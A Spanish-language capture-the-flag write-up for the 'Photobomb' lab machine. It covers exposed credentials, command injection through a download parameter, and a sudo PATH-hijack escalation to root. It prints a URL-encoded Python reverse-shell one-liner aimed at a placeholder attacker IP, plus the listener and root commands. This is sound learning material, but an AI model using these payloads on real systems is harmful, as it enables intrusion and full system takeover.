---
title: 'Photobomb'
description: ''
pubDate: 'May 12 2023'
heroImage: ''
slug: 'box/photobomb'
---

Nos metemos a la URL, sin antes cambiar el archivo <i>/etc/hosts</i>.
<img
  src='https://res.cloudinary.com/djc1umong/image/upload/v1665957627/bomb_page_ff29w1.webp'
/>

Vemos un login sencillo al hacer clic en <i>clic here!</i>, pero no contamos con credenciales.

Inspeccionamos el código fuente, y encontramos un archivo <i>photobomb.js</i>, y unos credenciales ahí por si acaso.
<img
  src='https://res.cloudinary.com/djc1umong/image/upload/v1665958090/bomb_view_source_cut_dongsv.webp'
/>
<img
src='https://res.cloudinary.com/djc1umong/image/upload/v1665963151/bomb_creds_cut_wqchuw.webp'
layout="responsive"
/>

Nos encontramos con una <i>impresora de fotos</i>, nos permite descargar con diferentes tamaños de resolucion en formato jpg y png.

Es hora de sacar el <Anchor src='https://portswigger.net/burp'>BurpSuite</Anchor> y ver a fondo que ocurre con esta petición al descargarnos fotos.

<img
src='https://res.cloudinary.com/djc1umong/image/upload/v1665964126/bomb_burp_cut_jqy1g9.webp'
/>

Haciendo pruebas con la herramienta, notamos que el parametro <i>filetype</i> se lo come con patatas, aca ingresamos una nuestra reverse Shell y escuchamos en:

```bash
$ nc -nlvp 4443
```

<img
src='https://res.cloudinary.com/djc1umong/image/upload/v1666148261/bomb_shell_d2_l9b4zh.webp'
/>

Shell usada para este caso, sin embargo hay muchas más en Google

```python

python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tun0-IP>",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Una vez dentro proseguimos al <Anchor src="#">obtener una bash</Anchor>

```bash
sudo -l
```

Matching Defaults entries for wizard on photobomb:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
(root) SETENV: NOPASSWD: /opt/cleanup.sh

```bash
cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
/bin/cat log/photobomb.log > log/photobomb.log.old
/usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

notamos que al final del scrip en <i>/opt/cleanup.sh </i>ejecutamos chown root:root

```bash
id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
id
uid=0(root) gid=0(root) groups=0(root)

# ROOTED
```
